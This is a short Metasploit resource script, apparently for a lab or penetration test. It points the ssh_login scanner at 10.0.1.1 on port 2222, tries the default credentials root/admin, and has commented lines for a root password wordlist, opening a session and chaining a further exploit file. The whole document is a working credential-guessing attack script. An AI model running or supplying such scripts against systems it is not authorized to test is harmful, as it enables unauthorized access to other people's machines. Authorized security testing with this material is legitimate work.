use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.1.1
set RPORT 2222
#set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
set USERNAME root
set PASSWORD admin
set VERBOSE true
set gatherproof false
save
run
#sessions -1
#resource exploit.txt
back
